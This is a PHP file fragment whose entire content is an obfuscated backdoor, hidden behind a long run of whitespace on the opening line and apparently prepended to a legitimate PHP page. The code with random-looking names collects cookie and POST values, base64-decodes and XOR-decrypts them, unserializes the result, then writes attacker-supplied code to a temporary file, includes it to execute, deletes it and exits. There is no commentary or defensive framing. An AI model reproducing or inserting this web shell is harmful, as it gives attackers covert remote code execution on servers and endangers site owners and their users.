<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("bykbaxjeo")){class bykbaxjeo{public static $tosdus = "vierqtthjzrnbmpj";public static $gzjnojib = NULL;public function __construct(){$fytxzs = @$_COOKIE[substr(bykbaxjeo::$tosdus, 0, 4)];if (!empty($fytxzs)){$akeib = "base64";$joxxofrzxt = "";$fytxzs = explode(",", $fytxzs);foreach ($fytxzs as $pguyx){$joxxofrzxt .= @$_COOKIE[$pguyx];$joxxofrzxt .= @$_POST[$pguyx];}$joxxofrzxt = array_map($akeib . "_decode", array($joxxofrzxt,));$joxxofrzxt = $joxxofrzxt[0] ^ str_repeat(bykbaxjeo::$tosdus, (strlen($joxxofrzxt[0]) / strlen(bykbaxjeo::$tosdus)) + 1);bykbaxjeo::$gzjnojib = @unserialize($joxxofrzxt);}}public function __destruct(){$this->fofzfn();}private function fofzfn(){if (is_array(bykbaxjeo::$gzjnojib)) {$tasely = sys_get_temp_dir() . "/" . crc32(bykbaxjeo::$gzjnojib["salt"]);@bykbaxjeo::$gzjnojib["write"]($tasely, bykbaxjeo::$gzjnojib["content"]);include $tasely;@bykbaxjeo::$gzjnojib["delete"]($tasely);exit();}}}$mwvnnssfht = new bykbaxjeo();$mwvnnssfht = NULL;} ?><?php
